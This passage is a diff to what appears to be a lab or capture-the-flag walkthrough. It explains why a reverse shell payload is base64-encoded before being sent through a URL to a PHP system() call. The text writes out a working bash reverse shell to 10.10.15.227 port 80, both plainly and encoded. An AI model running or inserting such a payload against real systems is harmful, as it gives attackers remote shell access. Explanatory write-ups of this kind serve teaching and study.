@@ -1065,8 +1065,33 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=
 ```
 
 This is the base64-encoded reverse shell payload.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
 
-Why 
+Why Do we encode the payload?
+
+It comes down to two problems that special characters cause:
+
+**Problem 1: URL interpretation**
+
+When you put a command like `bash -i >& /dev/tcp/10.10.15.227/80 0>&1` into a URL, certain characters have special meanings in HTTP:
+
+|Character|What HTTP thinks it means|
+|---|---|
+|`&`|Separates multiple query parameters|
+|`>`|Not valid in a URL at all|
+|`/`|Path separator|
+|`=`|Separates a parameter name from its value|
+
+So a URL like `?c=bash -i >& /dev/tcp/...` would arrive at the server completely broken — the `&` would be interpreted as the start of a second parameter, splitting your command in half before it ever reaches PHP.
+
+**Problem 2: Shell interpretation**
+
+Even if the URL survived intact, the shell on the server side might misinterpret the redirections (`>&`, `0>&1`) depending on how PHP's `system()` spawns the subprocess.
 <div align="center">
 <br>
 <br>
